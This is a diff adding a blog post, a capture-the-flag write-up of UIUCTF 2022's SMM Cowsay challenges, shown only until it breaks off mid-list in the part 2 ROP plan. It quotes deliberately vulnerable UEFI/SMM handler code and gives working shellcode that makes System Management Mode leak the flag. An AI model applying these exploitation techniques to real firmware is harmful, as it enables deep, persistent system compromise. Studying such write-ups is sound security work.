@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>UIUCTF 2022 - SMM Cowsay 1 and 2 | Fabio Pagani</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="UIUCTF 2022 - SMM Cowsay 1 and 2" />
+<meta name="author" content="Fabio Pagani" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="TL;DR: Exploiting code running in System Management Mode (aka Ring -2)" />
+<meta property="og:description" content="TL;DR: Exploiting code running in System Management Mode (aka Ring -2)" />
+<link rel="canonical" href="http://0.0.0.0:4002/blog/2022/08/07/smm-cowsay-1-and-2-uiuctf-2022.html" />
+<meta property="og:url" content="http://0.0.0.0:4002/blog/2022/08/07/smm-cowsay-1-and-2-uiuctf-2022.html" />
+<meta property="og:site_name" content="Fabio Pagani" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-07T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="UIUCTF 2022 - SMM Cowsay 1 and 2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Fabio Pagani"},"dateModified":"2022-08-07T00:00:00-07:00","datePublished":"2022-08-07T00:00:00-07:00","description":"TL;DR: Exploiting code running in System Management Mode (aka Ring -2)","headline":"UIUCTF 2022 - SMM Cowsay 1 and 2","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4002/blog/2022/08/07/smm-cowsay-1-and-2-uiuctf-2022.html"},"url":"http://0.0.0.0:4002/blog/2022/08/07/smm-cowsay-1-and-2-uiuctf-2022.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/blog/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4002/blog/feed.xml" title="Fabio Pagani" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/blog/">Fabio Pagani</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="https://pagabuc.me">About</a>
+        </div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">UIUCTF 2022 - SMM Cowsay 1 and 2</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2022-08-07T00:00:00-07:00" itemprop="datePublished">
+        Aug 7, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><strong>TL;DR: Exploiting code running in System Management Mode (aka Ring -2)</strong></p>
+
+<h3 id="introduction">Introduction</h3>
+<p>The past weekend I played UIUCTF 2022 with Shellphish.
+I mainly focused on SMM Cowsay 1 and 2, under the close supervision of the <em>Intel machine</em> Paul Grosen.
+We were able to solve both challenges, and actually to first blood both of them!</p>
+
+<h3 id="smm">SMM</h3>
+<p>Just in case it wasn’t clear from the title, these challenges are both about System Management Mode.
+SMM has recently been under spotlight after folks at <a href="https://binarly.io/advisories/index.html">Binarly.io</a> and <a href="https://binarly.io/advisories/index.html">SentinelOne</a> found vulnerabilities in many OEM firmware drivers.
+I will not go too much into the details of SMM, but please check out <a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch4001_x86-64_RVF+2021_v1/">OST2 Architecture 4001</a>, since it has an entire chapter dedicated to SMM — kudos to Xeno Kovah for this amazing resource.</p>
+
+<p>For the sake of this writeup, it’s just important to know that SMM is an operating mode of Intel processors.
+It is used for different firmware-level stuff, from advanced-power management to device emulation.
+The transition from any CPU mode to SMM happens when a System Management Interrupt (SMI) is delivered to the CPU:
+<img src="/blog/assets/images/transition_among_operating_modes.png" alt="Operating Modes" /></p>
+
+<p>This transition involves a process similar to a context-swith.
+When the CPU enters SMM it saves its state (registers) in the System Management RAM (SMRAM).
+The hardware then jumps to the SMI handler and, once the handler has completed its task, it executes the <code class="language-plaintext highlighter-rouge">rsm</code> instruction to re-load the state saved in SMRAM and it gives back control to the OS.</p>
+
+<p>The good news is that most of this process is transparent, thanks to the UEFI firmware development enviroment <a href="https://github.com/tianocore/edk2">TianoCore EDK II</a>.
+I am not an UEFI expert, but to solve this challenge is enough to know that SMI Handlers register themselves during boot.
+Each SMI handler is identified by a given GUID, and to interact with them from non-SMM code we only need pass this GUID to some EDK II functions.
+The framework takes care of making our parameter accessible from SMM, but also of entering SMM and dispatching the execution to the correct SMI handler.</p>
+
+<h2 id="smm-cowsay-1">SMM Cowsay 1</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>One of our engineers thought it would be a good idea to write Cowsay inside SMM.
+Then someone outside read out the trade secret (a.k.a. flag) stored at physical address 0x44440000,
+and since it could only be read from SMM, that can only mean one thing: it... was a horrible idea.
+
+$ stty raw -echo isig; nc smm-cowsay-1.chal.uiuc.tf 1337
+</code></pre></div></div>
+
+<p>The most important files in the handout are the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── chal_build                  # Patches to EDK II and QEMU
+│   ├── Dockerfile
+│   └── patches
+│       ├── edk2
+│       │   ├── 0003-SmmCowsay-Vulnerable-Cowsay.patch
+│       │   ├── 0004-Add-UEFI-Binexec.patch
+│       └── qemu
+│           └── 0001-Implement-UIUCTFMMIO-device.patch
+├── edk2_artifacts              # Compiled UEFI Drivers
+│   ├── Binexec.debug
+│   ├── Binexec.efi
+│   ├── SmmCowsay.debug
+│   ├── SmmCowsay.efi
+└── run                         # Script to start the challenge
+    ├── region4
+    └── run.sh
+</code></pre></div></div>
+
+<p>After running the challenge, we are asked to insert some shellcode which are promised it will be executed, as you can see in the following output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pagabuc@kay~/$ bash run.sh
+...
+Shell&gt; binexec
+ ____________________________________________________________________
+/ Welcome to binexec!                                                \
+| Type some shellcode in hex and I'll run it!                        |
+|                                                                    |
+| Type the word 'done' on a seperate line and press enter to execute |
+\ Type 'exit' on a seperate line and press enter to quit the program /
+ --------------------------------------------------------------------
+          \   ^__^
+           \  (oo)\_______
+              (__)\       )\/\
+                  ||----w |
+                  ||     ||
+
+Address of SystemTable: 0x00000000069EE018
+Address where I'm gonna run your code: 0x000000000517D100
+
+</code></pre></div></div>
+
+<p>After a quick review of the <code class="language-plaintext highlighter-rouge">patches</code> folder, we confirm that the challenge “entrypoint” is the Binexec driver.
+As shown below, this driver passes a pointer to the “Welcome to…” string to the <code class="language-plaintext highlighter-rouge">Cowsay</code> function.
+This function fills the <code class="language-plaintext highlighter-rouge">EFI_SMM_COMMUNICATE_HEADER</code> object with three values: the GUID of the cowsay SMM driver (stored in the field <code class="language-plaintext highlighter-rouge">HeaderGuid</code>), the pointer to the string (<code class="language-plaintext highlighter-rouge">Data</code>), and the size of the message (<code class="language-plaintext highlighter-rouge">MessageLength</code>).
+It then passes this object to the <code class="language-plaintext highlighter-rouge">Communicate</code> function, which will eventually take care of entering SMM and jumping to the correct SMI handler.</p>
+<figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"> <span class="n">Cowsay</span> <span class="p">(</span>
+  <span class="n">IN</span> <span class="n">CONST</span> <span class="n">CHAR16</span> <span class="o">*</span><span class="n">Message</span>
+  <span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">EFI_SMM_COMMUNICATE_HEADER</span> <span class="o">*</span><span class="n">Buffer</span><span class="p">;</span>
+
+  <span class="n">Buffer</span> <span class="o">=</span> <span class="n">AllocateRuntimeZeroPool</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">Buffer</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CHAR16</span> <span class="o">*</span><span class="p">));</span>
+  <span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">HeaderGuid</span> <span class="o">=</span> <span class="n">gEfiSmmCowsayCommunicationGuid</span><span class="p">;</span>
+  <span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">MessageLength</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CHAR16</span> <span class="o">*</span><span class="p">);</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">CONST</span> <span class="n">CHAR16</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">Data</span> <span class="o">=</span> <span class="n">Message</span><span class="p">;</span>
+
+  <span class="n">mSmmCommunication</span><span class="o">-&gt;</span><span class="n">Communicate</span><span class="p">(</span>
+    <span class="n">mSmmCommunication</span><span class="p">,</span>
+    <span class="n">Buffer</span><span class="p">,</span>
+    <span class="nb">NULL</span>
+  <span class="p">);</span>
+<span class="p">}</span>
+
+ <span class="n">UefiMain</span> <span class="p">(</span>
+  <span class="n">IN</span> <span class="n">EFI_HANDLE</span>        <span class="n">ImageHandle</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">EFI_SYSTEM_TABLE</span>  <span class="o">*</span><span class="n">SystemTable</span>
+  <span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">Cowsay</span><span class="p">(</span><span class="n">mIntro</span><span class="p">);</span> <span class="c1">// mIntro -&gt;  Welcome to binexec!</span>
+   <span class="cm">/* Read and execute our shellcode */</span>
+<span class="p">}</span></code></pre></figure>
+
+<figcaption>Parts of 0004-Add-UEFI-Binexec.patch</figcaption>
+</figure>
+
+<p>The “correct” SMI handler is shown below.
+As you can see, the function <code class="language-plaintext highlighter-rouge">SmmCowsayHandler</code> accepts <code class="language-plaintext highlighter-rouge">CommBuffer</code> and <code class="language-plaintext highlighter-rouge">CommBufferSize</code> as parameters; these correspond to the <code class="language-plaintext highlighter-rouge">Data</code> and <code class="language-plaintext highlighter-rouge">MessageLength</code> of the <code class="language-plaintext highlighter-rouge">EFI_SMM_COMMUNICATE_HEADER</code> object.
+This handler, after a couple of checks, passes the pointer stored at the beginning of <code class="language-plaintext highlighter-rouge">CommBuffer</code> to the <code class="language-plaintext highlighter-rouge">Cowsay</code> SMM function, which is the function that finally prints the message.</p>
+
+<figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">Cowsay</span> <span class="p">(</span>
+  <span class="n">IN</span> <span class="n">CONST</span> <span class="n">CHAR16</span> <span class="o">*</span><span class="n">Message</span>
+  <span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* This is where the Message is actually printed from SMM ! */</span>
+<span class="p">}</span>
+
+<span class="n">SmmCowsayHandler</span> <span class="p">(</span>
+  <span class="n">IN</span> <span class="n">EFI_HANDLE</span>  <span class="n">DispatchHandle</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">CONST</span> <span class="n">VOID</span>  <span class="o">*</span><span class="n">Context</span>         <span class="n">OPTIONAL</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">OUT</span> <span class="n">VOID</span>    <span class="o">*</span><span class="n">CommBuffer</span>      <span class="n">OPTIONAL</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">OUT</span> <span class="n">UINTN</span>   <span class="o">*</span><span class="n">CommBufferSize</span>  <span class="n">OPTIONAL</span>
+  <span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CommBuffer</span> <span class="o">||</span> <span class="o">!</span><span class="n">CommBufferSize</span> <span class="o">||</span> <span class="o">*</span><span class="n">CommBufferSize</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CHAR16</span> <span class="o">*</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">EFI_SUCCESS</span><span class="p">;</span>
+
+  <span class="n">Cowsay</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">CONST</span> <span class="n">CHAR16</span> <span class="o">**</span><span class="p">)</span><span class="n">CommBuffer</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figcaption>Parts of 0003-SmmCowsay-Vulnerable-Cowsay.patch</figcaption>
+</figure>
+
+<p>The road to solution for this challenge should be finally clear: let’s just ask <code class="language-plaintext highlighter-rouge">SmmCowsayHandler</code> to print the flag (stored at address 0x44440000)!
+At this point however you might be asking yourself: why do we need to mess with all this SMM thing?
+Since the challenge executes our shellcode.. can’t we just go and read the flag?
+After looking at the provided QEMU patches we have to turn down this idea, because the flag is stored in a MMIO device that returns the correct string only when the memory read operation is issued from SMM.</p>
+
+<figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="n">MemTxResult</span> <span class="nf">uiuctfmmio_region4_read_with_attrs</span><span class="p">(</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">,</span> <span class="n">MemTxAttrs</span> <span class="n">attrs</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">attrs</span><span class="p">.</span><span class="n">secure</span><span class="p">)</span> <span class="c1">// Are we outside SMM?</span>
+        <span class="n">uiuctfmmio_do_read</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">nice_try_msg</span><span class="p">,</span> <span class="n">nice_try_len</span><span class="p">);</span> <span class="c1">// FAKE Flag</span>
+    <span class="k">else</span>
+        <span class="n">uiuctfmmio_do_read</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">region4_msg</span><span class="p">,</span> <span class="n">region4_len</span><span class="p">);</span>   <span class="c1">// GOOD Flag</span>
+    <span class="k">return</span> <span class="n">MEMTX_OK</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<figcaption>Parts of 0001-Implement-UIUCTFMMIO-device.patch</figcaption>
+</figure>
+
+<h3 id="solution">Solution</h3>
+
+<p>The <del>laziest</del> fastest possible way to solve this challenge would be to directly call the <code class="language-plaintext highlighter-rouge">Cowsay</code> function of the Binexec driver, and passing the address of the flag as a parameter.
+Unfortunately for us, the compiler inlined this function call.
+However, we can still use the code around address 0x173B of the Binexec.debug file as a reference.
+In short, the final shellcode does the following:</p>
+
+<ol>
+  <li>
+    <p>Subtract 0x1d8a from the return address stored on the stack to calculate the base address of the Binexec driver, and save this address in r15</p>
+  </li>
+  <li>
+    <p>Call <code class="language-plaintext highlighter-rouge">InternalAllocateZeroPool</code> to allocate some memory for <code class="language-plaintext highlighter-rouge">EFI_SMM_COMMUNICATE_HEADER</code></p>
+  </li>
+  <li>
+    <p>Fill <code class="language-plaintext highlighter-rouge">EFI_SMM_COMMUNICATE_HEADER</code> with the Cowsay GUID, the address of the flag, and the size of the message (8 bytes)</p>
+  </li>
+  <li>
+    <p>Call <code class="language-plaintext highlighter-rouge">Communicate</code> and get the flag!</p>
+  </li>
+</ol>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.intel_syntax</span> <span class="nv">noprefix</span>
+<span class="nf">.global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+        <span class="c1">; r15 = base address of binexec</span>
+        <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">sub</span> <span class="nv">r15</span><span class="p">,</span> <span class="mh">0x1d8a</span>
+
+        <span class="c1">; addr of InternalAllocateZeroPool</span>
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">r15</span>
+        <span class="nf">add</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x115E</span>
+        <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x21</span>
+        <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="mh">0x6</span>
+        <span class="nf">call</span> <span class="nb">rax</span>
+        <span class="nf">mov</span> <span class="nv">r12</span><span class="p">,</span> <span class="nb">rax</span>
+
+        <span class="c1">; GUID</span>
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span><span class="o">+</span><span class="mh">0x3080</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span><span class="o">+</span><span class="mh">0x3088</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x0</span><span class="p">],</span> <span class="nb">rax</span>
+        <span class="nf">mov</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span> <span class="nb">rdx</span>
+
+        <span class="c1">; MessageLength and Data</span>
+        <span class="nf">movq</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span> <span class="mi">8</span>
+        <span class="nf">movq</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span> <span class="mh">0x44440001</span>
+
+        <span class="c1">; set up Communicate params</span>
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span><span class="o">+</span><span class="mh">0x103118</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rax</span>
+        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">r12</span>
+        <span class="nf">xor</span> <span class="nb">r8d</span><span class="p">,</span> <span class="nb">r8d</span>
+
+        <span class="c1">; Call Communicate!</span>
+        <span class="nf">call</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
+
+        <span class="nf">ret</span>
+</code></pre></div></div>
+
+<p>Compile with the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  gcc -nostdlib shellcode.S -o shellcode
+  objcopy -j .text -O binary shellcode shellcode.bin
+  xxd -p shellcode.bin &gt; shellcode.hex
+</code></pre></div></div>
+
+<p>The above shellcode will get you every other byte of the flag (<code class="language-plaintext highlighter-rouge">uut{hnrn_eoi_nufcet3201}</code>), since the message is a CHAR16 string but the flag is a “normal” CHAR8 string.
+Just change the address to 0x44440000 to leak the chars at odd positions (<code class="language-plaintext highlighter-rouge">icfwe_igzr_sisfiin_55e8</code>) and zip them to get the flag for SMM Cowsay 1: <code class="language-plaintext highlighter-rouge">uiuctf{when_ring_zero_is_insufficient_35250e18}</code>.</p>
+
+<h2 id="smm-cowsay-2">SMM Cowsay 2</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as
+debugging code.
+
+$ stty raw -echo isig; nc smm-cowsay-2.chal.uiuc.tf 1337
+</code></pre></div></div>
+
+<p>The non-SMM part of this second part is pretty much as before, except this time we pass to the SMM handler the actual message to print, not a pointer to it.</p>
+
+<figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="n">Buffer</span> <span class="o">=</span> <span class="n">AllocateRuntimeZeroPool</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">Buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">MessageLen</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Buffer</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+
+  <span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">HeaderGuid</span> <span class="o">=</span> <span class="n">gEfiSmmCowsayCommunicationGuid</span><span class="p">;</span>
+  <span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">MessageLength</span> <span class="o">=</span> <span class="n">MessageLen</span><span class="p">;</span>
+  <span class="n">CopyMem</span><span class="p">(</span><span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">Data</span><span class="p">,</span> <span class="n">Message</span><span class="p">,</span> <span class="n">MessageLen</span><span class="p">);</span>
+
+  <span class="n">mSmmCommunication</span><span class="o">-&gt;</span><span class="n">Communicate</span><span class="p">(</span>
+    <span class="n">mSmmCommunication</span><span class="p">,</span>
+    <span class="n">Buffer</span><span class="p">,</span>
+    <span class="nb">NULL</span>
+  <span class="p">);</span></code></pre></figure>
+
+<figcaption>Parts of 0004-Add-UEFI-Binexec.patch</figcaption>
+</figure>
+
+<p>On the other hand, this SMM handler is quite different.
+It stores a random canary in <code class="language-plaintext highlighter-rouge">mDebugData.Canary</code>, and it calls the function <code class="language-plaintext highlighter-rouge">SmmCopyMemToSmram</code> to copy the supplied message in <code class="language-plaintext highlighter-rouge">mDebugData.Message</code>.
+Finally, after a couple of checks, it calls the function stored in <code class="language-plaintext highlighter-rouge">mDebugData.CowsayFunc</code> (which is initialized to the SMM <code class="language-plaintext highlighter-rouge">Cowsay</code>).</p>
+
+<p>Upon a closer look at the <code class="language-plaintext highlighter-rouge">SmmCopyMemToSmram</code> call, we quickly realized that here is where the vulnerability is, since <code class="language-plaintext highlighter-rouge">CommBuffer</code> and <code class="language-plaintext highlighter-rouge">CommBufferSize</code> are under our control. This means that by supplying a large enough string we can write past the Message field.. and what’s after this field? A function pointer!</p>
+
+<figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="p">{</span>
+  <span class="n">CHAR16</span> <span class="n">Message</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span> <span class="c1">// This is 400 bytes, not 200!</span>
+  <span class="n">VOID</span> <span class="n">EFIAPI</span> <span class="p">(</span><span class="o">*</span> <span class="k">volatile</span> <span class="n">CowsayFunc</span><span class="p">)(</span><span class="n">IN</span> <span class="n">CONST</span> <span class="n">CHAR16</span> <span class="o">*</span><span class="n">Message</span><span class="p">,</span> <span class="n">IN</span> <span class="n">UINTN</span> <span class="n">MessageLen</span><span class="p">);</span>
+  <span class="n">BOOLEAN</span> <span class="k">volatile</span> <span class="n">Icebp</span><span class="p">;</span>
+  <span class="n">UINT64</span> <span class="k">volatile</span> <span class="n">Canary</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">mDebugData</span><span class="p">;</span>
+
+<span class="n">SmmCowsayHandler</span> <span class="p">(</span>
+  <span class="n">IN</span> <span class="n">EFI_HANDLE</span>  <span class="n">DispatchHandle</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">CONST</span> <span class="n">VOID</span>  <span class="o">*</span><span class="n">Context</span>         <span class="n">OPTIONAL</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">OUT</span> <span class="n">VOID</span>    <span class="o">*</span><span class="n">CommBuffer</span>      <span class="n">OPTIONAL</span><span class="p">,</span>
+  <span class="n">IN</span> <span class="n">OUT</span> <span class="n">UINTN</span>   <span class="o">*</span><span class="n">CommBufferSize</span>  <span class="n">OPTIONAL</span>
+  <span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">UINT64</span> <span class="n">Canary</span><span class="p">;</span>
+
+  <span class="n">Canary</span> <span class="o">=</span> <span class="n">AsmRdRand64</span><span class="p">();</span>
+  <span class="n">mDebugData</span><span class="p">.</span><span class="n">Canary</span> <span class="o">=</span> <span class="n">Canary</span><span class="p">;</span>
+
+  <span class="n">SmmCopyMemToSmram</span><span class="p">(</span><span class="n">mDebugData</span><span class="p">.</span><span class="n">Message</span><span class="p">,</span> <span class="n">CommBuffer</span><span class="p">,</span> <span class="n">CommBufferSize</span><span class="p">);</span> <span class="c1">// &lt;--- VULN</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">mDebugData</span><span class="p">.</span><span class="n">Canary</span> <span class="o">!=</span> <span class="n">Canary</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// We probably overrun into libraries. Don't trust anything. Make triple fault here.</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">mDebugData</span><span class="p">.</span><span class="n">Icebp</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// If you define WANT_ICEBP in QEMU you actually get a breakpoint right here.</span>
+    <span class="c1">// Have fun playing with SMM.</span>
+    <span class="n">__asm__</span> <span class="n">__volatile__</span> <span class="p">(</span>
+      <span class="s">".byte 0xf1"</span> <span class="c1">// icebp / int1</span>
+      <span class="o">:</span> <span class="o">:</span> <span class="o">:</span> <span class="s">"memory"</span>
+    <span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">SetMem</span><span class="p">(</span><span class="n">mDebugData</span><span class="p">.</span><span class="n">Message</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mDebugData</span><span class="p">.</span><span class="n">Message</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">mDebugData</span><span class="p">.</span><span class="n">CowsayFunc</span><span class="p">(</span><span class="n">CommBuffer</span><span class="p">,</span> <span class="n">CommBufferSize</span><span class="p">);</span>
+
+<span class="nl">out:</span>
+  <span class="n">DEBUG</span> <span class="p">((</span><span class="n">DEBUG_INFO</span><span class="p">,</span> <span class="s">"SmmCowsay SmmCowsayHandler Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+  <span class="k">return</span> <span class="n">EFI_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<figcaption>Simplified SMI Handler, adapted from 0003-SmmCowsay-Vulnerable-Cowsay.patch</figcaption>
+</figure>
+
+<h3 id="debugging">Debugging</h3>
+<p>Before we delve in our exploitation strategy, I want to spend some time to discuss how to setup a proper debugging environment.
+QEMU has the flag <code class="language-plaintext highlighter-rouge">-s -S</code> and gdb has <code class="language-plaintext highlighter-rouge">target remote</code>, but where should we put a breakpoint to debug SMM code?
+Fortunately for us, the SMM handler above contains a breakpoint functionality (<code class="language-plaintext highlighter-rouge">icebp</code>).
+If we craft a message that contains a non-zero value at offset 408, the SMI handler will execute this breakpoint.
+After sending this message, GDB will trap in SMM (you can double check this by searching for “SMM=1” in the output of “info register” in the QEMU Monitor):</p>
+
+<pre><code class="language-gdb">   0x7ee927a:   je     0x7ee927d
+=&gt; 0x7ee927c:   int1
+   0x7ee927d:   lea    rax,[rip+0x2fdc]        # 0x7eec260
+</code></pre>
+
+<p>As a side node, QEMU does not support this instruction by default, so I had to recompile it: after downloading the QEMU sources, I grepped for “WANT_ICEBP”, removed the #ifdef and rebuilt QEMU.</p>
+
+<figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#ifdef WANT_ICEBP
+</span>    <span class="k">case</span> <span class="mh">0xf1</span><span class="p">:</span> <span class="cm">/* icebp (undocumented, exits to external debugger) */</span>
+        <span class="n">gen_svm_check_intercept</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">pc_start</span><span class="p">,</span> <span class="n">SVM_EXIT_ICEBP</span><span class="p">);</span>
+        <span class="n">gen_debug</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">pc_start</span> <span class="o">-</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">cs_base</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+<span class="cp">#endif</span></code></pre></figure>
+
+<figcaption>Snippet from 'qemu-5.0.0/target/i386/translate.c'</figcaption>
+</figure>
+
+<p>Finally, since this will likely turn into ROPing our way to the flag, I wrote this simple <a href="/blog/assets/code/dumper_script.py">GDB script</a> to dump all the mapped pages and find the address of any ROP gadget we will need.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+<p>After crafting a message that is 408 bytes long, I put a breakpoint at the <code class="language-plaintext highlighter-rouge">mDebugData.CowsayFunc</code> callsite (address 0x7ee92c5) to inspect the program state.
+Since UEFI uses the Microsoft calling covention, <code class="language-plaintext highlighter-rouge">rcx</code> will contain a pointer to CommBuffer, while <code class="language-plaintext highlighter-rouge">rdx</code> is <code class="language-plaintext highlighter-rouge">CommBufferSize</code>.</p>
+
+<p>In short, we used the following exploit strategy to solve the challenge:</p>
+
+<ol>
+  <li>
+    <p>Find a gadget that moves <code class="language-plaintext highlighter-rouge">rcx</code> to <code class="language-plaintext highlighter-rouge">rsp</code>, so we can do stack pivoting</p>
+  </li>
+  <li>
+    <p>Clear CRO.WP, since the next step will modify the page tables, otherwise it will fail</p>
+  </li>
+  <li>
